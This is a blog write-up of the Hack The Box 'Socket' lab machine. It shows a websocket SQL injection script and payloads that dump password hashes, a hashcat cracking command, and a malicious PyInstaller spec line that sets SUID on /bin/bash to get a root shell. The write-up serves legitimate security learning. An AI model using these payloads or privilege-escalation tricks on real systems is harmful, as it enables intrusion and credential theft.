<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hack The Box - Socket [Medium] | 0x73796C31</title><meta name=keywords content="hackthebox"><meta name=description content="So let&rsquo;s start with a rustscan of the machine
Open 10.10.11.206:22 Open 10.10.11.206:80 Open 10.10.11.206:5789 [~] Starting Script(s) [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 14:37 EEST Initiating Ping Scan at 14:37 Scanning 10.10.11.206 [2 ports] Completed Ping Scan at 14:37, 0.05s elapsed (1 total hosts) Initiating Connect Scan at 14:37 Scanning qreader.htb (10.10.11.206) [3 ports] Discovered open port 22/tcp on 10.10.11.206 Discovered open port 80/tcp on 10.10.11.206 Discovered open port 5789/tcp on 10."><meta name=author content="Dimitar Ganev"><link rel=canonical href=https://sy1.sh/writeups/htb-socket/><link crossorigin=anonymous href=/assets/css/stylesheet.f8c2ee4fde28779dff9afcd3046f6bd6fc9cbeb1ddf60d48a81b676d7162c1bb.css integrity="sha256-+MLuT94od53/mvzTBG9r1vycvrHd9g1IqBtnbXFiwbs=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://sy1.sh/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sy1.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sy1.sh/favicon-32x32.png><link rel=apple-touch-icon href=https://sy1.sh/apple-touch-icon.png><link rel=mask-icon href=https://sy1.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Hack The Box - Socket [Medium]"><meta property="og:description" content="So let&rsquo;s start with a rustscan of the machine
Open 10.10.11.206:22 Open 10.10.11.206:80 Open 10.10.11.206:5789 [~] Starting Script(s) [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 14:37 EEST Initiating Ping Scan at 14:37 Scanning 10.10.11.206 [2 ports] Completed Ping Scan at 14:37, 0.05s elapsed (1 total hosts) Initiating Connect Scan at 14:37 Scanning qreader.htb (10.10.11.206) [3 ports] Discovered open port 22/tcp on 10.10.11.206 Discovered open port 80/tcp on 10.10.11.206 Discovered open port 5789/tcp on 10."><meta property="og:type" content="article"><meta property="og:url" content="https://sy1.sh/writeups/htb-socket/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-04-21T10:42:27+03:00"><meta property="article:modified_time" content="2023-04-21T10:42:27+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack The Box - Socket [Medium]"><meta name=twitter:description content="So let&rsquo;s start with a rustscan of the machine
Open 10.10.11.206:22 Open 10.10.11.206:80 Open 10.10.11.206:5789 [~] Starting Script(s) [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 14:37 EEST Initiating Ping Scan at 14:37 Scanning 10.10.11.206 [2 ports] Completed Ping Scan at 14:37, 0.05s elapsed (1 total hosts) Initiating Connect Scan at 14:37 Scanning qreader.htb (10.10.11.206) [3 ports] Discovered open port 22/tcp on 10.10.11.206 Discovered open port 80/tcp on 10.10.11.206 Discovered open port 5789/tcp on 10."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Writeups","item":"https://sy1.sh/writeups/"},{"@type":"ListItem","position":3,"name":"Hack The Box - Socket [Medium]","item":"https://sy1.sh/writeups/htb-socket/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Socket [Medium]","name":"Hack The Box - Socket [Medium]","description":"So let\u0026rsquo;s start with a rustscan of the machine\nOpen 10.10.11.206:22 Open 10.10.11.206:80 Open 10.10.11.206:5789 [~] Starting Script(s) [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 14:37 EEST Initiating Ping Scan at 14:37 Scanning 10.10.11.206 [2 ports] Completed Ping Scan at 14:37, 0.05s elapsed (1 total hosts) Initiating Connect Scan at 14:37 Scanning qreader.htb (10.10.11.206) [3 ports] Discovered open port 22/tcp on 10.10.11.206 Discovered open port 80/tcp on 10.10.11.206 Discovered open port 5789/tcp on 10.","keywords":["hackthebox"],"articleBody":"So let’s start with a rustscan of the machine\nOpen 10.10.11.206:22 Open 10.10.11.206:80 Open 10.10.11.206:5789 [~] Starting Script(s) [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 14:37 EEST Initiating Ping Scan at 14:37 Scanning 10.10.11.206 [2 ports] Completed Ping Scan at 14:37, 0.05s elapsed (1 total hosts) Initiating Connect Scan at 14:37 Scanning qreader.htb (10.10.11.206) [3 ports] Discovered open port 22/tcp on 10.10.11.206 Discovered open port 80/tcp on 10.10.11.206 Discovered open port 5789/tcp on 10.10.11.206 Completed Connect Scan at 14:37, 0.05s elapsed (3 total ports) Nmap scan report for qreader.htb (10.10.11.206) Host is up, received syn-ack (0.050s latency). Scanned at 2023-04-21 14:37:19 EEST for 0s PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack 5789/tcp open unknown syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds I went to port 80 to check what is there, the idea of the website is to create QR Codes and extract text out of QR Codes, first I thought that maybe there is something with the QR codes but after some examination I decided to give up on that path and I went over the other things such as the Linux/Windows application.\nUpon further discovery using strings over the linux binary, I realized that this a packaged exectuable that was created with pyinstaller so I’ve tried to unpack it with uncompyle6 and then the pyc files with pycdc.\nI found out the following things from the source code of qreader:\n... VERSION = '0.0.2' ws_host = 'ws://ws.qreader.htb:5789' ... def version(self): response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({ 'version': VERSION }))) data = json.loads(response) if 'error' not in data.keys(): version_info = data['message'] msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}''' self.statusBar().showMessage(msg) return None error = None['error'] self.statusBar().showMessage(error) def update(self): response = asyncio.run(ws_connect(ws_host + '/update', json.dumps({ 'version': VERSION }))) data = json.loads(response) if 'error' not in data.keys(): msg = '[INFO] ' + data['message'] self.statusBar().showMessage(msg) return None error = None['error'] self.statusBar().showMessage(error) This source code tries to connect to a websocket to get its version/update, so the paths for the websockets are:\nws://ws.qreader.htb:5789/update ws://ws.qreader.htb:5789/version I’ve tested both of these with claws tool. Then I crafted a python script to connect with the socket.\nWARNING: Be really careful which quotes you are using, ' or \" because that could interfere with the SQLi that I found in the version path!\nfrom websockets.sync.client import connect import json with connect(\"ws://ws.qreader.htb:5789/version\") as websocket: websocket.send(json.dumps({'version': '0.0.3\" UNION SELECT group_concat(answer),2,3,4 from answers-- -'})) m = websocket.recv() print(m) With this script, I’ve enumerated the tables, columns and the username with the following payloads:\n'0.0.3\" UNION SELECT group_concat(answer),2,3,4 from answers-- -' -\u003e This finds the user Thomas Keller '0.0.3\" UNION SELECT group_concat(password),2,3,4 from users-- -' -\u003e This find the password hash Cracking the password\n$ hashcat -m 0 -a 0 0c090c365fa0559b151a43e0fea39710 ~/tools/rockyou.txt Getting the username with adusergen\n$ echo -n \"Thomas Keller\" | adusergen Thomas.Keller ThomasKeller KellerThomas Keller.Thomas Tkeller T.keller Thomas-Keller T.keller thomas.keller thomaskeller kellerthomas keller.thomas tkeller \u003c--- Right One t.keller thomas-keller t.keller Root The root was fairly easy, you just have to read the documentation for spec files for pyinstaller, after that I crafted the following spec file:\nblock_cipher = __import__('os').system('chmod +s /bin/bash') tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build priv.spec 105 INFO: PyInstaller: 5.6.2 105 INFO: Python: 3.10.6 107 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35 110 INFO: UPX is not available. script '/home/tkeller/minimal.py' not found tkeller@socket:~$ /bin/bash -p bash-5.1# whoami root bash-5.1# cat /root/root.txt ","wordCount":"573","inLanguage":"en","datePublished":"2023-04-21T10:42:27+03:00","dateModified":"2023-04-21T10:42:27+03:00","author":{"@type":"Person","name":"Dimitar Ganev"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sy1.sh/writeups/htb-socket/"},"publisher":{"@type":"Organization","name":"0x73796C31","logo":{"@type":"ImageObject","url":"https://sy1.sh/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sy1.sh accesskey=h title="0x73796C31 (Alt + H)">0x73796C31</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://sy1.sh/posts/ title=Archive><span>Archive</span></a></li><li><a href=https://sy1.sh/cv title=CV><span>About</span></a></li><li><a href=https://sy1.sh/writeups/ title=Write-ups><span>Write-ups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sy1.sh>Home</a>&nbsp;»&nbsp;<a href=https://sy1.sh/writeups/>Writeups</a></div><h1 class=post-title>Hack The Box - Socket [Medium]</h1><div class=post-meta><span title='2023-04-21 10:42:27 +0300 +0300'>April 21, 2023</span>&nbsp;·&nbsp;3 min</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#root aria-label=Root>Root</a></li></ul></div></details></div><div class=post-content><p>So let&rsquo;s start with a rustscan of the machine</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Open 10.10.11.206:22
</span></span><span class=line><span class=cl>Open 10.10.11.206:80
</span></span><span class=line><span class=cl>Open 10.10.11.206:5789
</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> Starting Script<span class=o>(</span>s<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-04-21 14:37 EEST
</span></span><span class=line><span class=cl>Initiating Ping Scan at 14:37
</span></span><span class=line><span class=cl>Scanning 10.10.11.206 <span class=o>[</span><span class=m>2</span> ports<span class=o>]</span>
</span></span><span class=line><span class=cl>Completed Ping Scan at 14:37, 0.05s elapsed <span class=o>(</span><span class=m>1</span> total hosts<span class=o>)</span>
</span></span><span class=line><span class=cl>Initiating Connect Scan at 14:37
</span></span><span class=line><span class=cl>Scanning qreader.htb <span class=o>(</span>10.10.11.206<span class=o>)</span> <span class=o>[</span><span class=m>3</span> ports<span class=o>]</span>
</span></span><span class=line><span class=cl>Discovered open port 22/tcp on 10.10.11.206
</span></span><span class=line><span class=cl>Discovered open port 80/tcp on 10.10.11.206
</span></span><span class=line><span class=cl>Discovered open port 5789/tcp on 10.10.11.206
</span></span><span class=line><span class=cl>Completed Connect Scan at 14:37, 0.05s elapsed <span class=o>(</span><span class=m>3</span> total ports<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> qreader.htb <span class=o>(</span>10.10.11.206<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up, received syn-ack <span class=o>(</span>0.050s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Scanned at 2023-04-21 14:37:19 EEST <span class=k>for</span> 0s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE REASON
</span></span><span class=line><span class=cl>22/tcp   open  ssh     syn-ack
</span></span><span class=line><span class=cl>80/tcp   open  http    syn-ack
</span></span><span class=line><span class=cl>5789/tcp open  unknown syn-ack
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.12 seconds
</span></span></code></pre></div><p>I went to port 80 to check what is there, the idea of the website is to create QR Codes and extract text out of QR Codes, first I thought that maybe there is something with the QR codes but after some examination I decided to give up on that path and I went over the other things such as the Linux/Windows application.</p><p>Upon further discovery using <code>strings</code> over the linux binary, I realized that this a packaged exectuable that was created with <code>pyinstaller</code> so I&rsquo;ve tried to unpack it with <code>uncompyle6</code> and then the <code>pyc</code> files with <code>pycdc</code>.</p><p>I found out the following things from the source code of <code>qreader</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=n>VERSION</span> <span class=o>=</span> <span class=s1>&#39;0.0.2&#39;</span>
</span></span><span class=line><span class=cl><span class=n>ws_host</span> <span class=o>=</span> <span class=s1>&#39;ws://ws.qreader.htb:5789&#39;</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>version</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>ws_connect</span><span class=p>(</span><span class=n>ws_host</span> <span class=o>+</span> <span class=s1>&#39;/version&#39;</span><span class=p>,</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>({</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;version&#39;</span><span class=p>:</span> <span class=n>VERSION</span> <span class=p>})))</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;error&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>data</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=n>version_info</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>msg</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;&#39;&#39;[INFO] You have version </span><span class=si>{</span><span class=n>version_info</span><span class=p>[</span><span class=s1>&#39;version&#39;</span><span class=p>]</span><span class=si>}</span><span class=s1> which was released on </span><span class=si>{</span><span class=n>version_info</span><span class=p>[</span><span class=s1>&#39;released_date&#39;</span><span class=p>]</span><span class=si>}</span><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>statusBar</span><span class=p>()</span><span class=o>.</span><span class=n>showMessage</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=n>error</span> <span class=o>=</span> <span class=kc>None</span><span class=p>[</span><span class=s1>&#39;error&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>statusBar</span><span class=p>()</span><span class=o>.</span><span class=n>showMessage</span><span class=p>(</span><span class=n>error</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>update</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>response</span> <span class=o>=</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>ws_connect</span><span class=p>(</span><span class=n>ws_host</span> <span class=o>+</span> <span class=s1>&#39;/update&#39;</span><span class=p>,</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>({</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;version&#39;</span><span class=p>:</span> <span class=n>VERSION</span> <span class=p>})))</span>
</span></span><span class=line><span class=cl>	<span class=n>data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=s1>&#39;error&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>data</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>		<span class=n>msg</span> <span class=o>=</span> <span class=s1>&#39;[INFO] &#39;</span> <span class=o>+</span> <span class=n>data</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>		<span class=bp>self</span><span class=o>.</span><span class=n>statusBar</span><span class=p>()</span><span class=o>.</span><span class=n>showMessage</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>	<span class=n>error</span> <span class=o>=</span> <span class=kc>None</span><span class=p>[</span><span class=s1>&#39;error&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=bp>self</span><span class=o>.</span><span class=n>statusBar</span><span class=p>()</span><span class=o>.</span><span class=n>showMessage</span><span class=p>(</span><span class=n>error</span><span class=p>)</span>
</span></span></code></pre></div><p>This source code tries to connect to a websocket to get its version/update, so the paths for the websockets are:</p><pre tabindex=0><code>ws://ws.qreader.htb:5789/update
ws://ws.qreader.htb:5789/version
</code></pre><p>I&rsquo;ve tested both of these with <code>claws</code> tool. Then I crafted a python script to connect with the socket.</p><blockquote><p><strong><em>WARNING:</em></strong> Be really careful which quotes you are using, <code>'</code> or <code>"</code> because that could interfere with the SQLi that I found in the <code>version</code> path!</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>websockets.sync.client</span> <span class=kn>import</span> <span class=n>connect</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=n>connect</span><span class=p>(</span><span class=s2>&#34;ws://ws.qreader.htb:5789/version&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>websocket</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>websocket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>({</span><span class=s1>&#39;version&#39;</span><span class=p>:</span> <span class=s1>&#39;0.0.3&#34; UNION SELECT group_concat(answer),2,3,4 from answers-- -&#39;</span><span class=p>}))</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>websocket</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>m</span><span class=p>)</span>
</span></span></code></pre></div><p>With this script, I&rsquo;ve enumerated the tables, columns and the username with the following payloads:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=s1>&#39;0.0.3&#34; UNION SELECT group_concat(answer),2,3,4 from answers-- -&#39;</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>This</span><span class=w> </span><span class=n>finds</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=n>Thomas</span><span class=w> </span><span class=n>Keller</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=s1>&#39;0.0.3&#34; UNION SELECT group_concat(password),2,3,4 from users-- -&#39;</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>This</span><span class=w> </span><span class=n>find</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=n>hash</span><span class=w>
</span></span></span></code></pre></div><p>Cracking the password</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ hashcat -m <span class=m>0</span> -a <span class=m>0</span> 0c090c365fa0559b151a43e0fea39710 ~/tools/rockyou.txt
</span></span><span class=line><span class=cl>&lt;PASSWORD&gt;
</span></span></code></pre></div><p>Getting the username with <a href=https://github.com/syrull/hacks/tree/main/adusergen>adusergen</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> -n <span class=s2>&#34;Thomas Keller&#34;</span> <span class=p>|</span> adusergen
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Thomas.Keller
</span></span><span class=line><span class=cl>ThomasKeller
</span></span><span class=line><span class=cl>KellerThomas
</span></span><span class=line><span class=cl>Keller.Thomas
</span></span><span class=line><span class=cl>Tkeller
</span></span><span class=line><span class=cl>T.keller
</span></span><span class=line><span class=cl>Thomas-Keller
</span></span><span class=line><span class=cl>T.keller
</span></span><span class=line><span class=cl>thomas.keller
</span></span><span class=line><span class=cl>thomaskeller
</span></span><span class=line><span class=cl>kellerthomas
</span></span><span class=line><span class=cl>keller.thomas
</span></span><span class=line><span class=cl>		tkeller &lt;--- Right One
</span></span><span class=line><span class=cl>t.keller
</span></span><span class=line><span class=cl>thomas-keller
</span></span><span class=line><span class=cl>t.keller
</span></span></code></pre></div><h1 id=root>Root<a hidden class=anchor aria-hidden=true href=#root>#</a></h1><p>The root was fairly easy, you just have to read the documentation for spec files for <code>pyinstaller</code>, after that I crafted the following spec file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>block_cipher</span> <span class=o>=</span> <span class=nb>__import__</span><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;chmod +s /bin/bash&#39;</span><span class=p>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build priv.spec
</span></span><span class=line><span class=cl><span class=m>105</span> INFO: PyInstaller: 5.6.2
</span></span><span class=line><span class=cl><span class=m>105</span> INFO: Python: 3.10.6
</span></span><span class=line><span class=cl><span class=m>107</span> INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
</span></span><span class=line><span class=cl><span class=m>110</span> INFO: UPX is not available.
</span></span><span class=line><span class=cl>script <span class=s1>&#39;/home/tkeller/minimal.py&#39;</span> not found
</span></span><span class=line><span class=cl>tkeller@socket:~$ /bin/bash -p
</span></span><span class=line><span class=cl>bash-5.1# whoami
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>bash-5.1# cat /root/root.txt 
</span></span><span class=line><span class=cl>&lt;HASH&gt;
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://sy1.sh/tags/hackthebox/>hackthebox</a></li></ul><nav class=paginav><a class=prev href=https://sy1.sh/writeups/htb-joker/><span class=title>« Prev</span><br><span>Hack The Box - Joker [Hard]</span></a>
<a class=next href=https://sy1.sh/writeups/pg-sar/><span class=title>Next »</span><br><span>Proving Grounds (OSCP) - Sar</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sy1.sh>0x73796C31</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod (sy1 modified)</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>